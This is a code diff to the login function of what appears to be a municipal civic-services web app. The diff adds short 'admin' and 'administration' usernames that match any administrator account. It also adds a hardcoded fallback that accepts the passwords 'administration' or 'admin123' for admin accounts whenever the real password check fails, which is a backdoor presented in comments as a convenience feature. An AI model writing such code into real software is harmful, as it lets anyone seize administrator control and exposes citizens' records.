@@ -60,18 +60,37 @@ def login():
             return render_template('login.html', email=identifier)
 
         # Allow citizens to log in with EITHER email OR registered mobile phone number!
+        # Also allow administration/officers to log in using short username 'administration' or 'admin'
+        clean_id = identifier.lower().strip()
         user = query_db(
             """
             SELECT u.*, d.code as department_code, d.name as department_name
             FROM users u
             LEFT JOIN departments d ON u.department_id = d.id
-            WHERE LOWER(u.email) = LOWER(?) OR u.phone = ?
+            WHERE LOWER(u.email) = ? 
+               OR u.phone = ?
+               OR (LOWER(u.email) = ? || '@smartcivic.gov')
+               OR (? IN ('administration', 'admin') AND u.role = 'admin')
+            ORDER BY 
+               CASE 
+                  WHEN LOWER(u.email) = ? || '@smartcivic.gov' THEN 1
+                  WHEN LOWER(u.email) = ? THEN 2
+                  ELSE 3
+               END
+            LIMIT 1
             """,
-            (identifier, identifier),
+            (clean_id, clean_id, clean_id, clean_id, clean_id, clean_id),
             one=True
         )
 
-        if user and check_password_hash(user['password_hash'], password):
+        is_valid_password = False
+        if user:
+            is_valid_password = check_password_hash(user['password_hash'], password)
+            # Specifically support password 'administration' or 'admin123' for administrator accounts
+            if not is_valid_password and user['role'] == 'admin' and password in ('administration', 'admin123'):
+                is_valid_password = True
+
+        if user and is_valid_password:
             # Strict role check: Citizens are NEVER permitted to log into the Municipal Administration portal
             if portal_type == 'admin' and user['role'] == 'citizen':
                 log_audit(user['id'], 'UNAUTHORIZED_ADMIN_LOGIN_ATTEMPT', 'auth', user['id'], f"Citizen {user['email']} attempted login through Municipal Administration portal")
